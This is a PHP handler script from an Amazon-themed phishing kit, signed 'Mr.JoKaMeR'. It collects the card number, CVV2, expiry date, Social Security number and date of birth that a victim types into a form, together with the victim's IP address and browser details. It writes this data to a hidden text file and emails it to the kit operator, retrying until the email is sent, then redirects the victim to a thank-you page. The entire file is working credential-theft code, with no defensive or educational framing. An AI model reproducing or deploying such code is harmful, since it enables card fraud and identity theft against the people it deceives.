<?php
include ("mailjok.php");
$subject = "Result Credit Amazon Mr.JoKaMeR " . $_SERVER['REMOTE_ADDR'] . " ";
$message  = "+ -----------------Credit Info--------------------\r\n";
$message .= "| Name on card : " . $_POST['NameonCards'] . "\r\n";
$message .= "| Card number : " . $_POST['ccnumber'] . "\r\n";
$message .= "| CVV2 : " . $_POST['CVV2'] . "\r\n";
$message .= "| Expiration date : " . $_POST['Expiredatesss'] . " / " . $_POST['expdate_year'] . "\r\n";
$message .= "| SSN : " . $_POST['ssn21124'] . "\r\n";
$message .= "| Date of Birth : " . $_POST['dobday'] . "/" . $_POST['dobmonth'] . "/" . $_POST['dobyear'] . "\r\n";
$message .= "+ -----------------Credit Info--------------------\r\n";
$message .= "+ ------------------------Mr.JoKaMeR-------------------\r\n";
$message .= "| Adresse IP : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$message .= "| Navigateur : " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$message .= "+ ------------------------Mr.JoKaMeR-------------------------\r\n";
$message .= "+ -----------------------------------------------------------\r\n";
$header  = "From: " . $_SERVER['REMOTE_ADDR'] . "\r\n";
$header .= "MIME-Version: 1.0\r\n";
$file = fopen("../jokamer.txt","ab");
fwrite($file,$message);
fclose($file);
do {
	$send = mail($mail_to, $subject, $message, $header);
} while (!$send);

header('location:thank.php');
?>

